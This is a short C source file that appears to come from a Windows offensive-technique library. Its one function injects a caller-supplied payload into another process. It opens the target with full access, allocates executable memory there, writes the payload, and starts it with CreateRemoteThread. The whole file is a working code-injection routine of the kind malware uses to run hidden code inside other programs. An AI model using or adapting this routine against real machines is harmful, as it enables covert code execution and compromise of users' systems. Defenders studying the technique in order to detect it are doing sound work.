#include "Win32Helper.h"

BOOL MpfPiWriteProcessMemoryCreateRemoteThread(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetProcessId)
{
	HANDLE hHandle = NULL, hThread = NULL;
	LPVOID BaseAddress = NULL;
	BOOL bFlag = FALSE;

	hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetProcessId);
	if (hHandle == NULL)
		goto EXIT_ROUTINE;

	BaseAddress = VirtualAllocEx(hHandle, NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BaseAddress == NULL)
		goto EXIT_ROUTINE;

	if (!SetProcessPrivilegeToken(0))
		goto EXIT_ROUTINE;

	if (!WriteProcessMemory(hHandle, BaseAddress, Payload, PayloadSizeInBytes, NULL))
		goto EXIT_ROUTINE;

	hThread = CreateRemoteThread(hHandle, NULL, 0, (LPTHREAD_START_ROUTINE)BaseAddress, NULL, 0, NULL);
	if (hThread == NULL)
		goto EXIT_ROUTINE;

	WaitForSingleObject(hThread, INFINITE);

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hThread)
		CloseHandle(hThread);

	if (hHandle)
		CloseHandle(hHandle);

	return bFlag;
}